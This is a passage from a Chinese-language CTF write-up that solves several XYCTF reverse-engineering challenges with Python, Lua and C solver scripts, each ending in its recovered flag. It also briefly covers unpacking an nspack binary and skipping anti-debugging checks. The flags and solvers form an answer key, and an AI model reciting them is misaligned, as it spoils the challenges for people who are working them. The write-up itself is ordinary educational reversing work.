class="comment">//XYCTF&#123;R@nd_1s_S0_S0_S0_easy!&#125;</span></span><br></pre></td></tr></table></figure><h4 id="今夕是何年">今夕是何年</h4><p>架构题，是龙芯架构，配好虚拟机，然后直接输出</p><p><img src="https://s2.loli.net/2024/04/09/dmL7viqNCcRYBZI.png" alt="image-20240409185205541"></p><h4 id="何须相思煮余年">何须相思煮余年</h4><p>居然是一个txt文件，开头是push ebp，那没事了，直接ida32打开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">88</span>,<span class="number">88</span>,<span class="number">134</span>,<span class="number">87</span>,<span class="number">74</span>,<span class="number">118</span>,<span class="number">318</span>,<span class="number">101</span>,<span class="number">59</span>,<span class="number">92</span>,<span class="number">480</span>,<span class="number">60</span>,<span class="number">65</span>,<span class="number">41</span>,<span class="number">770</span>,<span class="number">110</span>,<span class="number">73</span>,<span class="number">31</span>,<span class="number">918</span>,<span class="number">39</span>,<span class="number">120</span>,<span class="number">27</span>,<span class="number">1188</span>,<span class="number">47</span>,<span class="number">77</span>,<span class="number">24</span>,<span class="number">1352</span>,<span class="number">44</span>,<span class="number">81</span>,<span class="number">23</span>,<span class="number">1680</span>,<span class="number">46</span>,<span class="number">85</span>,<span class="number">15</span>,<span class="number">1870</span>,<span class="number">66</span>,<span class="number">91</span>,<span class="number">16</span>,<span class="number">4750</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">    <span class="keyword">if</span> (i%<span class="number">4</span>==<span class="number">0</span>):</span><br><span class="line">        enc[i]-=i</span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">4</span>==<span class="number">1</span>):</span><br><span class="line">        enc[i]+=i</span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">4</span>==<span class="number">2</span>):</span><br><span class="line">        enc[i]//=i</span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">4</span>==<span class="number">3</span>):</span><br><span class="line">        enc[i]^=i</span><br><span class="line">pl(enc)</span><br><span class="line"><span class="comment"># XYCTF&#123;5b3e07567a9034d06851475481507a75&#125;</span></span><br></pre></td></tr></table></figure><h4 id="砸核桃">砸核桃</h4><p>查一下壳是nspack，直接找个工具脱了</p><p>然后打开。又是很简单的逻辑,直接写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k = <span class="string">&#x27;this_is_not_flag&#x27;</span></span><br><span class="line"></span><br><span class="line">last = [<span class="number">0x00000012</span>, <span class="number">0x00000004</span>, <span class="number">0x00000008</span>, <span class="number">0x00000014</span>, <span class="number">0x00000024</span>, <span class="number">0x0000005C</span>, <span class="number">0x0000004A</span>, <span class="number">0x0000003D</span>, <span class="number">0x00000056</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000010</span>, <span class="number">0x00000067</span>, <span class="number">0x00000000</span>, <span class="number">0x00000041</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000046</span>, <span class="number">0x0000005A</span>, <span class="number">0x00000044</span>, <span class="number">0x00000042</span>, <span class="number">0x0000006E</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000044</span>, <span class="number">0x00000072</span>, <span class="number">0x0000000C</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000040</span>, <span class="number">0x0000003E</span>, <span class="number">0x0000004B</span>, <span class="number">0x0000005F</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x0000004C</span>, <span class="number">0x0000005E</span>, <span class="number">0x0000005B</span>, <span class="number">0x00000017</span>, <span class="number">0x0000006E</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000016</span>, <span class="number">0x00000068</span>, <span class="number">0x0000005B</span>, <span class="number">0x00000012</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>]</span><br><span class="line"></span><br><span class="line">pxor(last,k)</span><br><span class="line"><span class="comment"># flag&#123;59b8ed8f-af22-11e7-bb4a-3cf862d1ee75&#125;</span></span><br></pre></td></tr></table></figure><h3 id="week3">week3</h3><h4 id="ez-enc">ez_enc</h4><p>打开main，是一个简单的带mod的加密，既然是前一个数据和后一个数据有关系，还不大，直接z3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;IMouto&#x27;</span></span><br><span class="line"></span><br><span class="line">last = [<span class="number">0x27</span>, <span class="number">0x24</span>, <span class="number">0x17</span>, <span class="number">0x0B</span>, <span class="number">0x50</span>, <span class="number">0x03</span>, <span class="number">0xC8</span>, <span class="number">0x0C</span>, </span><br><span class="line">        <span class="number">0x1F</span>, <span class="number">0x17</span>, <span class="number">0x36</span>, <span class="number">0x55</span>, <span class="number">0xCB</span>, <span class="number">0x2D</span>, <span class="number">0xE9</span>, <span class="number">0x32</span>, </span><br><span class="line">        <span class="number">0x0E</span>, <span class="number">0x11</span>, <span class="number">0x26</span>, <span class="number">0x02</span>, <span class="number">0x0C</span>, <span class="number">0x07</span>, <span class="number">0xFC</span>, <span class="number">0x27</span>, </span><br><span class="line">        <span class="number">0x3D</span>, <span class="number">0x2D</span>, <span class="number">0xED</span>, <span class="number">0x35</span>, <span class="number">0x59</span>, <span class="number">0xEB</span>, <span class="number">0x3C</span>, <span class="number">0x3E</span>, </span><br><span class="line">        <span class="number">0xE4</span>, <span class="number">0x7D</span>]</span><br><span class="line"></span><br><span class="line">out,flag = zini(<span class="number">34</span>)</span><br><span class="line">f = Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">    f.add(last[i]==(<span class="built_in">ord</span>(key[i%<span class="number">6</span>])^out[i+<span class="number">1</span>]+out[i] % <span class="number">20</span>))</span><br><span class="line"></span><br><span class="line">isflag(f,flag)</span><br><span class="line">zcheck(f,flag)</span><br><span class="line"><span class="comment"># flag&#123;!_r3ea11y_w4nt_@_cu7e_s1$ter&#125;</span></span><br></pre></td></tr></table></figure><h4 id="what’s-this">what’s this</h4><p>是lua的字节码，放到在线解码里面解码，接出来就是正常的lua代码，</p><p>前面是一堆混淆的函数，最后是真的代码，大概是这个</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Xor</span><span class="params">(num1, num2)</span></span></span><br><span class="line">  <span class="keyword">local</span> tmp1 = num1</span><br><span class="line">  <span class="keyword">local</span> tmp2 = num2</span><br><span class="line">  <span class="keyword">local</span> str = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">repeat</span></span><br><span class="line">    <span class="keyword">local</span> s1 = tmp1 % <span class="number">2</span></span><br><span class="line">    <span class="keyword">local</span> s2 = tmp2 % <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> s1 == s2 <span class="keyword">then</span></span><br><span class="line">      str = <span class="string">&quot;0&quot;</span> .. str</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      str = <span class="string">&quot;1&quot;</span> .. str</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    tmp1 = <span class="built_in">math</span>.<span class="built_in">modf</span>(tmp1 / <span class="number">2</span>)</span><br><span class="line">    tmp2 = <span class="built_in">math</span>.<span class="built_in">modf</span>(tmp2 / <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">until</span> tmp1 == <span class="number">0</span> <span class="keyword">and</span> tmp2 == <span class="number">0</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">tonumber</span>(str, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">value = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">output</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">local</span> temp = <span class="built_in">string</span>.<span class="built_in">byte</span>(flag, i)</span><br><span class="line">  temp = <span class="built_in">string</span>.<span class="built_in">char</span>(Xor(temp, <span class="number">8</span>) % <span class="number">256</span>)</span><br><span class="line">  value = value .. temp</span><br><span class="line">  i = i + <span class="number">1</span></span><br><span class="line">  <span class="keyword">if</span> i &gt; <span class="built_in">string</span>.<span class="built_in">len</span>(flag) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> _ = <span class="number">1</span>, <span class="number">1000</span> <span class="keyword">do</span></span><br><span class="line">  x = <span class="number">3</span></span><br><span class="line">  y = x * <span class="number">3</span></span><br><span class="line">  z = y / <span class="number">4</span></span><br><span class="line">  w = z - <span class="number">5</span></span><br><span class="line">  <span class="keyword">if</span> w == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;This line will never be executed&quot;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>, <span class="built_in">string</span>.<span class="built_in">len</span>(flag) <span class="keyword">do</span></span><br><span class="line">  temp = <span class="built_in">string</span>.<span class="built_in">byte</span>(value, i)</span><br><span class="line">  temp = <span class="built_in">string</span>.<span class="built_in">char</span>(temp + <span class="number">3</span>)</span><br><span class="line">  <span class="built_in">output</span> = <span class="built_in">output</span> .. temp</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">result = <span class="built_in">output</span>:<span class="built_in">rep</span>(<span class="number">10</span>)</span><br><span class="line">invalid_list = &#123;</span><br><span class="line">  <span class="number">1</span>,</span><br><span class="line">  <span class="number">2</span>,</span><br><span class="line">  <span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _ = <span class="number">1</span>, <span class="number">20</span> <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">table</span>.<span class="built_in">insert</span>(invalid_list, <span class="number">4</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> _ = <span class="number">1</span>, <span class="number">50</span> <span class="keyword">do</span></span><br><span class="line">  result = result .. <span class="string">&quot;A&quot;</span></span><br><span class="line">  <span class="built_in">table</span>.<span class="built_in">insert</span>(invalid_list, <span class="number">4</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>, <span class="built_in">string</span>.<span class="built_in">len</span>(<span class="built_in">output</span>) <span class="keyword">do</span></span><br><span class="line">  temp = <span class="built_in">string</span>.<span class="built_in">byte</span>(<span class="built_in">output</span>, i)</span><br><span class="line">  temp = <span class="built_in">string</span>.<span class="built_in">char</span>(temp - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> _ = <span class="number">1</span>, <span class="number">30</span> <span class="keyword">do</span></span><br><span class="line">  result = result .. <span class="built_in">string</span>.<span class="built_in">lower</span>(<span class="built_in">output</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> _ = <span class="number">1</span>, <span class="number">950</span> <span class="keyword">do</span></span><br><span class="line">  x = <span class="number">3</span></span><br><span class="line">  y = x * <span class="number">3</span></span><br><span class="line">  z = y / <span class="number">4</span></span><br><span class="line">  w = z - <span class="number">5</span></span><br><span class="line">  <span class="keyword">if</span> w == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;This line will never be executed&quot;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> _ = <span class="number">1</span>, <span class="number">50</span> <span class="keyword">do</span></span><br><span class="line">  x = <span class="number">-1</span></span><br><span class="line">  y = x * <span class="number">4</span></span><br><span class="line">  z = y / <span class="number">2</span></span><br><span class="line">  w = z - <span class="number">3</span></span><br><span class="line">  <span class="keyword">if</span> w == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;This line will also never be executed&quot;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">obfuscated_output = to_base64(<span class="built_in">output</span>)</span><br><span class="line">obfuscated_output = <span class="built_in">string</span>.<span class="built_in">reverse</span>(obfuscated_output)</span><br><span class="line">obfuscated_output = <span class="built_in">string</span>.<span class="built_in">gsub</span>(obfuscated_output, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">obfuscated_output = <span class="built_in">string</span>.<span class="built_in">gsub</span>(obfuscated_output, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">obfuscated_output = <span class="built_in">string</span>.<span class="built_in">gsub</span>(obfuscated_output, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line">invalid_variable = obfuscated_output:<span class="built_in">rep</span>(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">if</span> obfuscated_output == <span class="string">&quot;==AeuFEcwxGPuJ0PBNzbC16ctFnPB5DPzI0bwx6bu9GQ2F1XOR1U&quot;</span> <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;You get the flag.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;F**k!&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析一下是base64加换字加一些奇怪的加密，那丢给chatgpt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Xor</span>(<span class="params">num1, num2</span>):</span><br><span class="line">    <span class="keyword">return</span> num1 ^ num2</span><br><span class="line"></span><br><span class="line">obfuscated_output = <span class="string">&quot;==AeuFEcwxGPuJ0PBNzbC16ctFnPB5DPzI0bwx6bu9GQ2F1XOR1U&quot;</span></span><br><span class="line">obfuscated_output = obfuscated_output.replace(<span class="string">&quot;3&quot;</span>, <span class="string">&quot;g&quot;</span>).replace(<span class="string">&quot;4&quot;</span>, <span class="string">&quot;H&quot;</span>).replace(<span class="string">&quot;6&quot;</span>, <span class="string">&quot;W&quot;</span>)[::-<span class="number">1</span>]</span><br><span class="line">output = base64.b64decode(obfuscated_output).decode()</span><br><span class="line"></span><br><span class="line">value = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> output:</span><br><span class="line">    temp = <span class="built_in">ord</span>(char) - <span class="number">3</span></span><br><span class="line">    value += <span class="built_in">chr</span>(temp)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> value:</span><br><span class="line">    temp = Xor(<span class="built_in">ord</span>(char), <span class="number">8</span>) % <span class="number">256</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(temp)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># XYCTF&#123;5dcbaed781363fbfb7d8647c1aee6c&#125;</span></span><br></pre></td></tr></table></figure><h4 id="ez-math">ez_math</h4><p>是python的混淆，还没有工具，用美化工具美化一下，还是可以理解，大概就是把a*b sum了一下，最后再化简一手</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) == <span class="number">32</span> <span class="keyword">and</span> (</span><br><span class="line">    (flag[<span class="number">0</span>] * (flag[<span class="number">0</span>] - <span class="number">176</span>)) +</span><br><span class="line">    (flag[<span class="number">1</span>] * (flag[<span class="number">1</span>] - <span class="number">178</span>)) +</span><br><span class="line">    (flag[<span class="number">2</span>] * (flag[<span class="number">2</span>] - <span class="number">134</span>)) +</span><br><span class="line">    (flag[<span class="number">3</span>] * (flag[<span class="number">3</span>] - <span class="number">168</span>)) +</span><br><span class="line">    (flag[<span class="number">4</span>] * (flag[<span class="number">4</span>] - <span class="number">140</span>)) +</span><br><span class="line">    (flag[<span class="number">5</span>] * (flag[<span class="number">5</span>] - <span class="number">246</span>)) +</span><br><span class="line">    (flag[<span class="number">6</span>] * (flag[<span class="number">6</span>] - <span class="number">226</span>)) +</span><br><span class="line">    (flag[<span class="number">7</span>] * (flag[<span class="number">7</span>] - <span class="number">110</span>)) +</span><br><span class="line">    (flag[<span class="number">8</span>] * (flag[<span class="number">8</span>] - <span class="number">174</span>)) +</span><br><span class="line">    (flag[<span class="number">9</span>] * (flag[<span class="number">9</span>] - <span class="number">178</span>)) +</span><br><span class="line">    (flag[<span class="number">10</span>] * (flag[<span class="number">10</span>] - <span class="number">142</span>)) +</span><br><span class="line">    (flag[<span class="number">11</span>] * (flag[<span class="number">11</span>] - <span class="number">230</span>)) +</span><br><span class="line">    (flag[<span class="number">12</span>] * (flag[<span class="number">12</span>] - <span class="number">198</span>)) +</span><br><span class="line">    (flag[<span class="number">13</span>] * (flag[<span class="number">13</span>] - <span class="number">170</span>)) +</span><br><span class="line">    (flag[<span class="number">14</span>] * (flag[<span class="number">14</span>] - <span class="number">234</span>)) +</span><br><span class="line">    (flag[<span class="number">15</span>] * (flag[<span class="number">15</span>] - <span class="number">224</span>)) +</span><br><span class="line">    (flag[<span class="number">16</span>] * (flag[<span class="number">16</span>] - <span class="number">232</span>)) +</span><br><span class="line">    (flag[<span class="number">17</span>] * (flag[<span class="number">17</span>] - <span class="number">168</span>)) +</span><br><span class="line">    (flag[<span class="number">18</span>] * (flag[<span class="number">18</span>] - <span class="number">178</span>)) +</span><br><span class="line">    (flag[<span class="number">19</span>] * (flag[<span class="number">19</span>] - <span class="number">176</span>)) +</span><br><span class="line">    (flag[<span class="number">20</span>] * (flag[<span class="number">20</span>] - <span class="number">212</span>)) +</span><br><span class="line">    (flag[<span class="number">21</span>] * (flag[<span class="number">21</span>] - <span class="number">220</span>)) +</span><br><span class="line">    (flag[<span class="number">22</span>] * (flag[<span class="number">22</span>] - <span class="number">212</span>)) +</span><br><span class="line">    (flag[<span class="number">23</span>] * (flag[<span class="number">23</span>] - <span class="number">150</span>)) +</span><br><span class="line">    (flag[<span class="number">24</span>] * (flag[<span class="number">24</span>] - <span class="number">222</span>)) +</span><br><span class="line">    (flag[<span class="number">25</span>] * (flag[<span class="number">25</span>] - <span class="number">242</span>)) +</span><br><span class="line">    (flag[<span class="number">26</span>] * (flag[<span class="number">26</span>] - <span class="number">170</span>)) +</span><br><span class="line">    (flag[<span class="number">27</span>] * (flag[<span class="number">27</span>] - <span class="number">168</span>)) +</span><br><span class="line">    (flag[<span class="number">28</span>] * (flag[<span class="number">28</span>] - <span class="number">150</span>)) +</span><br><span class="line">    (flag[<span class="number">29</span>] * (flag[<span class="number">29</span>] - <span class="number">232</span>)) +</span><br><span class="line">    (flag[<span class="number">30</span>] * (flag[<span class="number">30</span>] - <span class="number">142</span>)) +</span><br><span class="line">    (flag[<span class="number">31</span>] * (flag[<span class="number">31</span>] - <span class="number">250</span>)) + <span class="number">297412</span> == <span class="number">0</span></span><br><span class="line">):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过观察可以发现，每一行后面减的数除以二就是flag</p><p>那就直接除以二</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">XYCTF</span><span class="template-variable">&#123;q7WYGscUuptTYXjnjKoyUTKtG&#125;</span></span><br></pre></td></tr></table></figure><h4 id="给阿姨倒一杯卡布奇诺">给阿姨倒一杯卡布奇诺</h4><p>是一个简单的tea，魔改的部分是一开始的data1和data2的异或</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> i;</span><br><span class="line"><span class="type">uint32_t</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">data1 ^= *v;</span><br><span class="line">data2 ^= v[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0x1F</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">sum += <span class="number">1853174124</span>;</span><br><span class="line">data1 += ((data2 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]) ^ (data2 + sum) ^ (*k + <span class="number">16</span> * data2) ^ (sum + i);</span><br><span class="line">data2 += ((data1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]) ^ (data1 + sum) ^ (k[<span class="number">2</span>] + <span class="number">16</span> * data1) ^ (sum + i);</span><br><span class="line">&#125;</span><br><span class="line">*v = data1;</span><br><span class="line">v[<span class="number">1</span>] = data2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个还是相当于把传入当key，data1和2更像是加密的值，要解密直接在最后异或上前一个的最后值就出来了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">uint32_t</span> sum = <span class="number">0x6E75316C</span> * <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">data1 = *v;</span><br><span class="line">data2 = v[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0x1f</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">data2 -= ((data1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]) ^ (data1 + sum) ^ (k[<span class="number">2</span>] + <span class="number">16</span> * data1) ^ (sum + i);</span><br><span class="line">data1 -= ((data2 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]) ^ (data2 + sum) ^ (*k + <span class="number">16</span> * data2) ^ (sum + i);</span><br><span class="line">sum -= <span class="number">0x6E75316C</span>;</span><br><span class="line">&#125;</span><br><span class="line">*v = *(v - <span class="number">2</span>) ^ data1;</span><br><span class="line">v[<span class="number">1</span>] = *(v - <span class="number">1</span>) ^ data2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里要注意i要是反着的，因为加密的时候用了i</p><p>出来是</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">62333331</span></span><br><span class="line"><span class="number">34656666</span></span><br><span class="line"><span class="number">32643130</span></span><br><span class="line"><span class="number">30613332</span></span><br><span class="line"><span class="number">35383332</span></span><br><span class="line"><span class="number">63303964</span></span><br><span class="line"><span class="number">63316635</span></span><br><span class="line"><span class="number">37373361</span></span><br></pre></td></tr></table></figure><p>转成字符再用xyctf包起来(题目说的是flag{}但是试了不行)：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">XYCTF</span>&#123;<span class="number">133</span>bffe401d223a02385d90c5f1ca377&#125;</span><br></pre></td></tr></table></figure><h4 id="easy-language">easy language</h4><p>这个题好坑啊！！QAQ</p><p>先通过e-decompliner插件找到主要目的地</p><p>可以看到是aes</p><p>最后的判断是</p><p><img src="https://s2.loli.net/2024/04/18/LKfxNsRWCpMVqkP.png" alt="image-20240418095501581"></p><p>根据signseacher扫描结果，发现有反调试，通过附加调试跳过</p><p>在</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v5 = 字节集比较((_BYTE *)byte_59D0F4 + <span 